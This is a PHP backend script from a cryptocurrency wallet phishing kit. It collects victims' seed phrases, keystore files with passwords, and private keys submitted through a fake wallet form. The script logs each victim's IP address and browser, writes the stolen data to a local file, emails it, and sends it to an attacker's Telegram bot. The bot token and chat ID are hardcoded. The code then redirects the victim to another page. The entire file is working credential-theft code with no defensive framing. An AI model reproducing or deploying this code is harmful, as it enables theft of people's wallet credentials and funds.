<?php
$Receive_email="";
$redirect="https://www.google.com/";
$telegram_enable = true;
	$telegrambot = "bot5291224089:AAFphAlFR5MVPGlM0Amc8YzCLW9npK7r8TU";
	$telegram_chatid = "-781381979";

if (isset($_POST['walletApp'])) {
if (isset($_POST['btn1'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Phrase |--------------|\n";
	$message .= "Wallet             : ".$_POST['walletApp']."\n";
	$message .= "Phrase             : ".$_POST['phrase']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	$count = $_POST['count'];

}else if (isset($_POST['btn2'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Keystore json |--------------|\n";
	$message .= "Wallet             : ".$_POST['walletApp']."\n";
	$message .= "Keystore json             : ".$_POST['keystoreJSON']."\n";
	$message .= "Password             : ".$_POST['password']."\n";
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./bar.html");
	
	
}
else if (isset($_POST['btn3'])) {
	

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|----------| Private key |--------------|\n";
	$message .= "Wallet             : ".$_POST['walletApp']."\n";
	$message .= "Private key             : ".$_POST['privateKey']."\n";
	
	
	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- CrEaTeD bY VeNzA --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 
	
	header("Location: ./bar.html");
	
	
}
$Txt_Rezlt = fopen('rezult.html', 'a+');
	fwrite($Txt_Rezlt, $message);
	fclose($Txt_Rezlt);

  $data = $message;
		  $send = ['chat_id'=>$telegram_chatid,'text'=>$data];
		  $website = "https://api.telegram.org/".$telegrambot;
		  $ch = curl_init($website . '/sendMessage');
		  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		  curl_setopt($ch, CURLOPT_POST, 1);
		  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
		  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
		  $result = curl_exec($ch);
		  curl_close($ch);
		}
?>